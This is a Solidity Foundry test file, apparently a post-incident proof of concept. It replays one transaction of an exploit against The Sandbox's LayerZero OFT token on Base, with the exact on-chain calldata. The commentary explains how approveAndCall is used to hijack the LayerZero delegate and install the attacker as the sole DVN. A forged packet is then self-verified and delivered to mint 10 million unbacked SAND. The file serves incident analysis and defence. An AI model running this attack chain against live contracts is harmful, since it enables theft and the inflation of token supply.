// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// The Sandbox (SAND) — LayerZero OFT deployment on Base
// Unbacked SAND minted out of thin air. One representative tx of a still-ongoing campaign that had
// minted ~$49B face value across 400+ txs at report time. This PoC reproduces ONE tx faithfully.
//
// Exploit tx   : 0x76ed03844ff61520a0fb99278f92f2f1453b24ccbacd20b91131703e4a56a446 (Base block 50289412)
// Attacker EOA : 0x638Ccb18370eE228378a565c1d4D0F9620d7F296 (tx.origin, mint recipient; nonce 72)
// Attack ctrt  : 0xd7Cb71EE00a812FC22ACcfE08A2f59A5Add2f6Ca (CREATE'd this tx; becomes delegate + DVN)
// Victim token : 0xac531Eb26Ca1d21b85126De8FB87E80E09002DcF  (OFTSand, the SAND OFT)
// EndpointV2   : 0x1a44076050125825900e736c501f859c50fE728c
// ReceiveUln302: 0xc70AB6f32772f59fBfc23889Caf4Ba3376C84bAf
// Mint this tx : 10,000,000 SAND (1e25, amountSD 1e13 * decimalConversionRate 1e12)
//
// Root cause (permissionless code defect, verified against the on-chain trace; NO key/admin
// compromise — every call below is reachable by any caller):
//
//   OFTSand.approveAndCall(target, amount, data) is an ERC677-style helper that does
//       target.call{value: msg.value}(data)
//   with msg.sender == the token itself. Its ONLY guard is
//       doFirstParamEqualsAddress(data, _msgSender())
//   i.e. the first 32-byte word of `data` must equal the caller. That guard is meant to stop
//   spending someone else's approval, but it does nothing to constrain WHICH function the token
//   is made to call. So it is a generic "call any contract AS the token" primitive.
//
//   The token is the OApp registered in the LayerZero EndpointV2. Attacker calls
//       approveAndCall(Endpoint, 0, setDelegate(attacker))
//   The first param of setDelegate(address) is `attacker` == caller, so the guard passes, and the
//   token executes Endpoint.setDelegate(attacker) with msg.sender == token, hijacking the OApp's
//   LayerZero delegate role (normally only settable by the token's onlyOwner setDelegate()).
//
//   As delegate the attacker reconfigures the OApp's receive stack:
//     1. Endpoint.setConfig(OFTSand, ReceiveUln302, UlnConfig{requiredDVNs:[attacker]}) — makes the
//        attacker's own contract the sole required DVN for inbound packets from srcEid 30101.
//     2. ReceiveUln302.verify(header, payloadHash, 1) as that DVN — self-attests a forged inbound
//        packet (peer[30101] == the OFT's own address, since SAND OFT is deployed at the same
//        address on Ethereum and Base, so the sender field passes the OApp peer check).
//     3. ReceiveUln302.commitVerification(header, payloadHash) — commits it to the Endpoint.
//     4. Endpoint.lzReceive(origin, OFTSand, guid, message, "") — delivers the forged packet;
//        OFTSand._credit does a bare _mint(to, amountLD). Unbacked SAND appears.
//
// Calldata below is the exact on-chain calldata. The delegate/DVN address is the real attack
// contract 0xd7Cb71...; we prank as that address for the calls that require it, and as the
// attacker EOA for tx.origin, matching the real trace exactly.

struct Origin {
    uint32 srcEid;
    bytes32 sender;
    uint64 nonce;
}

struct SetConfigParam {
    uint32 eid;
    uint32 configType;
    bytes config;
}

interface IOFTSand {
    function approveAndCall(address target, uint256 amount, bytes calldata data) external payable returns (bytes memory);
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function decimalConversionRate() external view returns (uint256);
}

interface IEndpointV2 {
    function setConfig(address oapp, address lib, SetConfigParam[] calldata params) external;
    function lzReceive(
        Origin calldata origin,
        address receiver,
        bytes32 guid,
        bytes calldata message,
        bytes calldata extraData
    ) external payable;
    function delegates(address) external view returns (address);
}

interface IReceiveUln302 {
    function verify(bytes calldata packetHeader, bytes32 payloadHash, uint64 confirmations) external;
    function commitVerification(bytes calldata packetHeader, bytes32 payloadHash) external;
}

contract SandboxOFT_exp is Test {
    IOFTSand internal constant SAND = IOFTSand(0xac531Eb26Ca1d21b85126De8FB87E80E09002DcF);
    IEndpointV2 internal constant ENDPOINT = IEndpointV2(0x1a44076050125825900e736c501f859c50fE728c);
    IReceiveUln302 internal constant RECEIVE_ULN = IReceiveUln302(0xc70AB6f32772f59fBfc23889Caf4Ba3376C84bAf);

    address internal constant ATTACKER_EOA = 0x638Ccb18370eE228378a565c1d4D0F9620d7F296; // tx.origin + mint recipient
    address internal constant ATTACK_CTRT = 0xd7Cb71EE00a812FC22ACcfE08A2f59A5Add2f6Ca; // delegate + DVN + msg.sender

    uint32 internal constant SRC_EID = 30101; // Ethereum mainnet LZ eid (forged source)
    uint64 internal constant NONCE = 455;
    bytes32 internal constant SENDER = 0x000000000000000000000000ac531eb26ca1d21b85126de8fb87e80e09002dcf;
    bytes32 internal constant GUID = 0x41e1696e58458feb3b1ceaec165f0e716a748343cd930ecbfd9e7fea97ddf821;
    bytes32 internal constant PAYLOAD_HASH = 0xe9858d4b29aa90b5ce5a637d3003273fc71a83a423bdbf5319235f2520f75403;

    // 81-byte packet header: version|nonce|srcEid|sender|dstEid|receiver
    bytes internal constant HEADER =
        hex"0100000000000001c700007595000000000000000000000000ac531eb26ca1d21b85126de8fb87e80e09002dcf000075e8000000000000000000000000ac531eb26ca1d21b85126de8fb87e80e09002dcf";

    // OFT message: 32-byte toAddress (attacker EOA) + 6-byte amountSD (0x09184e72a000 = 1e13)
    bytes internal constant MESSAGE =
        hex"000000000000000000000000638ccb18370ee228378a565c1d4d0f9620d7f296000009184e72a000";

    // setDelegate(0xd7Cb71...) — first param == caller so approveAndCall's guard passes.
    // (trailing zero word is exactly as on-chain; ignored by a 1-arg decode.)
    bytes internal constant SET_DELEGATE_DATA =
        hex"ca5eb5e1000000000000000000000000d7cb71ee00a812fc22accfe08a2f59a5add2f6ca0000000000000000000000000000000000000000000000000000000000000000";

    // abi.encode(UlnConfig{confirmations:1, requiredDVNCount:1, optional 0/0, requiredDVNs:[0xd7Cb71...], optionalDVNs:[]})
    bytes internal constant ULN_CONFIG =
        hex"0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000d7cb71ee00a812fc22accfe08a2f59a5add2f6ca0000000000000000000000000000000000000000000000000000000000000000";

    function setUp() public {
        // one block before the exploit tx
        vm.createSelectFork("base", 50289411);
    }

    function testExploit() public {
        uint256 balBefore = SAND.balanceOf(ATTACKER_EOA);
        uint256 supplyBefore = SAND.totalSupply();
        emit log_named_decimal_uint("SAND balance of attacker before", balBefore, 18);

        // msg.sender = attack contract (matches trace), tx.origin = attacker EOA
        vm.startPrank(ATTACK_CTRT, ATTACKER_EOA);

        // 1. Hijack the OApp's LayerZero delegate via the arbitrary-call-as-token primitive.
        SAND.approveAndCall(address(ENDPOINT), 0, SET_DELEGATE_DATA);
        assertEq(ENDPOINT.delegates(address(SAND)), ATTACK_CTRT, "delegate not hijacked");

        // 2. As delegate, set the attacker's own contract as the sole required DVN.
        SetConfigParam[] memory params = new SetConfigParam[](1);
        params[0] = SetConfigParam({eid: SRC_EID, configType: 2, config: ULN_CONFIG});
        ENDPOINT.setConfig(address(SAND), address(RECEIVE_ULN), params);

        // 3. As that DVN, self-attest a forged inbound packet, then commit it to the Endpoint.
        RECEIVE_ULN.verify(HEADER, PAYLOAD_HASH, 1);
        RECEIVE_ULN.commitVerification(HEADER, PAYLOAD_HASH);

        // 4. Deliver the forged packet -> OFTSand._credit -> unbacked _mint.
        Origin memory origin = Origin({srcEid: SRC_EID, sender: SENDER, nonce: NONCE});
        ENDPOINT.lzReceive(origin, address(SAND), GUID, MESSAGE, "");

        vm.stopPrank();

        uint256 balAfter = SAND.balanceOf(ATTACKER_EOA);
        uint256 minted = balAfter - balBefore;
        emit log_named_decimal_uint("SAND balance of attacker after ", balAfter, 18);
        emit log_named_decimal_uint("Unbacked SAND minted            ", minted, 18);

        // amountSD 1e13 * decimalConversionRate 1e12 == 1e25 == 10,000,000 SAND
        assertEq(minted, 10_000_000e18, "mint amount mismatch");
        assertEq(SAND.totalSupply() - supplyBefore, minted, "totalSupply not inflated by mint");
    }
}
